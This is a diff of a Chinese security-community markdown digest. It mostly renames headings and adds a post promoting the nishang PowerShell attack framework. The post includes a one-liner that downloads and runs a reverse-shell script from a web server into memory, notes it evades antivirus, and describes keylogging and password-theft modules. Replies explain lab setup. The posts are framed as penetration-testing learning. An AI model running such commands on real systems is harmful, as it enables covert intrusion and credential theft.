@@ -4,8 +4,8 @@
 - [webshell扫描](#webshell扫描)
 - [域渗透](#域渗透)
 - [MSF](#msf)
-- [Bash](#bash)
-- [powershell](#powershell)
+- [Linux Shell](#linux-shell)
+- [PowerShell](#powershell)
 - [Downloader](#downloader)
 - [Windows COM](#windows-com)
 - [Exchange](#exchange)
@@ -110,7 +110,7 @@ BTW：今天转的 FreeBuf 另一篇文章作者据说只是个高中生。
 
 ---
 
-## Bash
+## Linux Shell
 
 
 <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-06-22:
@@ -118,7 +118,7 @@ BTW：今天转的 FreeBuf 另一篇文章作者据说只是个高中生。
 
 __#姿势#__
 
-  一条命令实现无文件兼容性强的反弹后门,收集自强大的前乌云。
+一条命令实现无文件兼容性强的反弹后门,收集自强大的前乌云。
 我觉得很实用且强大,分享给大家.
 
 ```
@@ -185,7 +185,7 @@ __#姿势#__
 ---
 
 
-## powershell
+## Powershell
 
 <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-19:
 
@@ -416,6 +416,68 @@ Win32_ShadowCopy.Create(
 
 <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这里有份朋友写的指南也可以参考：
 [pentest-wiki/How-to-use-vssadmin.md at master · ni...](https://github.com/nixawk/pentest-wiki/blob/master/4.Post-Exploitation/Windows_ActiveDirectory/How-to-use-vssadmin.md)
+
+...
+
+---
+
+<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-07-12:
+
+
+__#工具#__
+
+nishang 牛逼的powershell渗透框架
+玩渗透的都在夸powershell各种bypass，各种无文件入侵。我们当然得了解下了，有多强大，谁试谁知道！
+
+nishang是作者nikhil_mitt在渗透测试过程中，根据实战经验编写出来的，各个脚本都有很强大的实战意义。
+什么下载和执行、键盘记录、屏幕监视、内网扫描、抓HASH、用Mimikatz 抓密码、各式各样的反弹、反弹meterpreter shell还有删除补丁等等强大模块。
+其中键盘记录跟屏幕监控，觉得挺有意思的。
+键盘记录脚本会将记录的信息用POST方式发到你设置的URL上，读取到你设置的URL下你设置的特定内容它会停止记录。
+屏幕监控开启后，会在对方电脑上开启一个端口，你用web访问它这个端口就会生成对方屏幕的截图，并且会实时刷新，挺有意思。
+简单演示下：
+
+```
+C:\Users\Administrator>powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.190/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp) -Reverse -IPAddress 192.168.1.190 -port 8888
+```
+
+将你的利用脚本放到你的web服务器中，然后在你的webshell上直接执行上面这样的命令调用执行，直接加载进内存，所以bypass各种杀软。
+
+还可以加载特定的exe程序进内存执行，只要没有写入磁盘动作，AV对它没任何反应。
+
+可用插件太多了，地址在这里 
+[GitHub - samratashok/nishang: Nishang - PowerShell...](https://github.com/samratashok/nishang)
+
+
+
+另外照顾一下像我一样的小白，找了两篇不错的利用文章，小白看一遍，照着实验来一发是最好的了。
+当然关于晋级的学习路线，就是想办法搞懂框架里面每个ps脚本，完全看懂，搞明白为什么这样编写，那样你不是大神都难啊！
+
+
+[60字节 - 无文件渗透测试实验 - n0tr00t](https://www.n0tr00t.com/2017/03/09/penetration-test-without-file.html)
+
+这篇实验很不错
+
+
+[http://www.4hou.com/technology/5962.html](http://www.4hou.com/technology/5962.html)
+
+这篇介绍了一些功能
+
+<img src="https://images.xiaomiquan.com/Fm5xgpU8CtkJdA1HGdpE2Lc8iZ4o?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:lUnN4kveeBAKsxpdmxom6PAP-Js=" width="50%" height="50%" align="middle"/>
+<img src="https://images.xiaomiquan.com/FoXVJry5A5tEbpiAolQu7NpF5Yku?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:2XNEHgmrZhTpLawfaPYTimGy0kg=" width="50%" height="50%" align="middle"/>
+
+
+...
+
+<img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 太复杂看不太懂，问一下，60字节 - 无文件渗透测试实验 搭建环境没有源码，漏洞如何利用都不清楚如何实验。
+
+<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 你会用虚拟机不？先用虚拟机搭起那个拓扑图，这步可以做到吗？然后在一台web服务器上，放上nishang的脚本，那么就可以在你拿了webshell的那台机器上执行我上面贴的那条命令，就可以执行攻击脚本了。那一条还不懂，说出来，不要怕丑，一切以弄懂知识为主。
+
+<img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 在一台虚拟机上多个系统如何多个ip？是使用vpn吗
+
+<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__: 虚拟机可以软件模拟出多个内网，方便做实验，以vmware为例，搞明白 编辑-虚拟网络编辑器里面的配置，同一个vmnet就是在同一个网络下。有什么再不懂的百度下
+
+<img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 好的谢谢
+
 
 ...
 
